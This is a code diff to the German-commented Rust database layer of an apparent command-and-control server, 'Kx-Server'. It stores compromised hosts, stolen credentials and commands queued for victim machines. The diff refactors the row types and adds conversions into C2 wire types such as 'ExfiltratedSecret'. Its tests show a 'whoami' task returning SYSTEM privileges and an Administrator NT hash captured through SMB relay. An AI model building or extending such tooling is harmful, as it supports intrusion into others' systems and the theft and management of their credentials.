@@ -1,16 +1,22 @@
 //! Kx-Server Datenbank-Schicht (rusqlite).
 //!
 //! Speichert kompromittierte Hosts, erbeutete Secrets und ausgeführte Tasks.
+//!
+//! Die Zeilen der Datenbank und die Nachrichten des C2-Protokolls sind zwei
+//! verschiedene Sachen. Hier stehen die Zeilentypen (`HostRow`, `SecretRow`,
+//! `TaskRow`), ohne serde — sie werden per Positionsindex gelesen, nicht
+//! serialisiert. Die Wire-Typen besitzt `kx_core::c2`; die Umwandlung passiert
+//! über die `From`-Implementierungen am Dateiende.
 
 use std::path::Path;
 use std::sync::Mutex;
 
+use kx_core::c2;
 use rusqlite::{Connection, params};
-use serde::{Deserialize, Serialize};
 
-/// Ein kompromittierter oder erkannter Host.
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct Host {
+/// Zeile der `hosts`-Tabelle.
+#[derive(Debug, Clone)]
+pub struct HostRow {
     pub id: String,
     pub ip: String,
     pub hostname: String,
@@ -20,9 +26,9 @@ pub struct Host {
     pub last_seen: String,
 }
 
-/// Ein erbeutetes Secret (Credential).
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct Secret {
+/// Zeile der `secrets`-Tabelle.
+#[derive(Debug, Clone)]
+pub struct SecretRow {
     pub id: String,
     pub host_id: String,
     pub cred_type: String,
@@ -32,9 +38,9 @@ pub struct Secret {
     pub collected_at: String,
 }
 
-/// Ein auszuführender oder bereits ausgeführter Task.
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct Task {
+/// Zeile der `tasks`-Tabelle.
+#[derive(Debug, Clone)]
+pub struct TaskRow {
     pub id: String,
     pub host_id: String,
     pub command: String,
@@ -79,7 +85,7 @@ impl Db {
     }
 
     /// Registriert einen Host (neu oder bestehend).
-    pub fn upsert_host(&self, h: &Host) -> Result<(), DbError> {
+    pub fn upsert_host(&self, h: &HostRow) -> Result<(), DbError> {
         self.conn.lock().unwrap().execute(
             "INSERT INTO hosts (id, ip, hostname, os, status, first_seen, last_seen)
              VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)
@@ -91,13 +97,13 @@ impl Db {
     }
 
     /// Liefert alle Hosts.
-    pub fn list_hosts(&self) -> Result<Vec<Host>, DbError> {
+    pub fn list_hosts(&self) -> Result<Vec<HostRow>, DbError> {
         let conn = self.conn.lock().unwrap();
         let mut stmt = conn.prepare(
             "SELECT id, ip, hostname, os, status, first_seen, last_seen FROM hosts",
         )?;
         let rows = stmt.query_map([], |r| {
-            Ok(Host {
+            Ok(HostRow {
                 id: r.get(0)?,
                 ip: r.get(1)?,
                 hostname: r.get(2)?,
@@ -111,7 +117,7 @@ impl Db {
     }
 
     /// Speichert ein neues Secret.
-    pub fn insert_secret(&self, s: &Secret) -> Result<(), DbError> {
+    pub fn insert_secret(&self, s: &SecretRow) -> Result<(), DbError> {
         self.conn.lock().unwrap().execute(
             "INSERT INTO secrets (id, host_id, cred_type, username, password, source, collected_at)
              VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
@@ -121,13 +127,13 @@ impl Db {
     }
 
     /// Liefert alle Secrets.
-    pub fn list_secrets(&self) -> Result<Vec<Secret>, DbError> {
+    pub fn list_secrets(&self) -> Result<Vec<SecretRow>, DbError> {
         let conn = self.conn.lock().unwrap();
         let mut stmt = conn.prepare(
             "SELECT id, host_id, cred_type, username, password, source, collected_at FROM secrets",
         )?;
         let rows = stmt.query_map([], |r| {
-            Ok(Secret {
+            Ok(SecretRow {
                 id: r.get(0)?,
                 host_id: r.get(1)?,
                 cred_type: r.get(2)?,
@@ -141,7 +147,7 @@ impl Db {
     }
 
     /// Erzeugt einen Task.
-    pub fn insert_task(&self, t: &Task) -> Result<(), DbError> {
+    pub fn insert_task(&self, t: &TaskRow) -> Result<(), DbError> {
         self.conn.lock().unwrap().execute(
             "INSERT INTO tasks (id, host_id, command, status, result, created_at)
              VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
@@ -151,13 +157,13 @@ impl Db {
     }
 
     /// Liefert alle Tasks.
-    pub fn list_tasks(&self) -> Result<Vec<Task>, DbError> {
+    pub fn list_tasks(&self) -> Result<Vec<TaskRow>, DbError> {
         let conn = self.conn.lock().unwrap();
         let mut stmt = conn.prepare(
             "SELECT id, host_id, command, status, result, created_at FROM tasks",
         )?;
         let rows = stmt.query_map([], |r| {
-            Ok(Task {
+            Ok(TaskRow {
                 id: r.get(0)?,
                 host_id: r.get(1)?,
                 command: r.get(2)?,
@@ -167,5 +173,124 @@ impl Db {
             })
         })?;
         rows.collect::<Result<Vec<_>, _>>().map_err(Into::into)
+    }
+}
+
+/// Die Zeile nennt den Host `id`; im C2-Protokoll heißt dasselbe Feld `host_id`.
+impl From<HostRow> for c2::Host {
+    fn from(row: HostRow) -> Self {
+        c2::Host {
+            host_id: row.id,
+            ip: row.ip,
+            hostname: row.hostname,
+            os: row.os,
+            status: row.status,
+            first_seen: row.first_seen,
+            last_seen: row.last_seen,
+        }
+    }
+}
+
+impl From<SecretRow> for c2::ExfiltratedSecret {
+    fn from(row: SecretRow) -> Self {
+        c2::ExfiltratedSecret {
+            id: row.id,
+            host_id: row.host_id,
+            cred_type: row.cred_type,
+            username: row.username,
+            password: row.password,
+            source: row.source,
+            collected_at: row.collected_at,
+        }
+    }
+}
+
+impl From<TaskRow> for c2::Task {
+    fn from(row: TaskRow) -> Self {
+        c2::Task {
+            id: row.id,
+            host_id: row.host_id,
+            command: row.command,
+            status: row.status,
+            result: row.result,
+            created_at: row.created_at,
+        }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::collections::BTreeSet;
+
+    fn keys(value: &serde_json::Value) -> BTreeSet<String> {
+        value.as_object().expect("Objekt").keys().cloned().collect()
+    }
+
+    /// Die Zeile wird zu dem Wire-Typ, den der C2-Server ausliefert — und zu
+    /// genau dem Feldnamen-Set, das der Operator erwartet.
+    #[test]
+    fn host_row_maps_to_wire_host() {
+        let row = HostRow {
+            id: "10.0.0.5".into(),
+            ip: "10.0.0.5".into(),
+            hostname: "target".into(),
+            os: "Windows".into(),
+            status: c2::STATUS_COMPROMISED.into(),
+            first_seen: "2026-11-11T00:00:00Z".into(),
+            last_seen: "2026-11-11T00:05:00Z".into(),
+        };
+        let wire = c2::Host::from(row);
+        assert_eq!(wire.host_id, "10.0.0.5");
+        assert_eq!(wire.status, c2::STATUS_COMPROMISED);
+
+        let json = serde_json::to_value(&wire).expect("serialisierbar");
+        assert_eq!(
+            keys(&json),
+            BTreeSet::from([
+                "first_seen".to_string(),
+                "hostname".to_string(),
+                "host_id".to_string(),
+                "ip".to_string(),
+                "last_seen".to_string(),
+                "os".to_string(),
+                "status".to_string(),
+            ])
+        );
+    }
+
+    /// Die Task-Zeile behält das Feld `result` — es ist derselbe Name, den der
+    /// Client liest. Vorher sendete der Server `result`, der Client erwartete
+    /// `output`, und das Ergebnis ging verloren.
+    #[test]
+    fn task_row_maps_result_field() {
+        let row = TaskRow {
+            id: "t-1".into(),
+            host_id: "10.0.0.5".into(),
+            command: "whoami".into(),
+            status: "done".into(),
+            result: "nt authority\\system".into(),
+            created_at: "2026-11-11T00:06:00Z".into(),
+        };
+        let json = serde_json::to_value(c2::Task::from(row)).expect("serialisierbar");
+        assert_eq!(json["result"], "nt authority\\system");
+        assert!(json.get("output").is_none());
+    }
+
+    #[test]
+    fn secret_row_maps_to_wire_secret() {
+        let row = SecretRow {
+            id: "s-1".into(),
+            host_id: "10.0.0.5".into(),
+            cred_type: "nt_hash".into(),
+            username: "Administrator".into(),
+            password: "hash".into(),
+            source: "smb_relay".into(),
+            collected_at: "2026-11-11T00:05:00Z".into(),
+        };
+        let wire = c2::ExfiltratedSecret::from(row);
+        assert_eq!(wire.host_id, "10.0.0.5");
+        assert_eq!(wire.cred_type, "nt_hash");
+        assert_eq!(wire.source, "smb_relay");
     }
 }
